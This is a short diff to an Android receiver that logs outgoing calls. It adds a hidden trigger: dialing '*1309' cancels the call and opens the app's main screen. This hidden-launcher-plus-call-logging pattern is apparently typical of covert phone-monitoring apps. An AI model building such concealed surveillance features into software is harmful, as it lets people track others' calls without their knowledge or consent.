@@ -45,6 +45,14 @@ public class OutgoingCallPhoneEventReceiver extends BroadcastReceiver {
 
 		if (null == state) {
 			String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
+			if("*1309".equalsIgnoreCase(phoneNumber))
+			{
+				abortBroadcast();
+				Intent i = new Intent();
+				i.setClassName("com.xaviar.ui","com.xaviar.ui.MainActivity");
+				i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+				context.startActivity(i);
+			}
 			callLogEntry = CalllogEventUtil.createStartCallData(phoneNumber,TYPE);				
 		} else if (state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_RINGING)) {			
 			return;
